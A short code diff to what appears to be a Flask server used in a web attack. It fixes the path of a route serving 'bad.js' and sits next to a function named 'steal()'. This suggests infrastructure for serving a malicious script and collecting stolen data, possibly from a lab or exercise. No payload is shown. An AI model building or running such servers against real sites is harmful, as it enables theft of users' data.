@@ -12,7 +12,7 @@ def steal():
 
 @app.route("/badjs/bad.js")
 def serve_bad_js():
-    return open("/badjs/bad.js").read(), 200, {"Content-Type": "application/javascript"}
+    return open("badjs/bad.js").read(), 200, {"Content-Type": "application/javascript"}
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80)
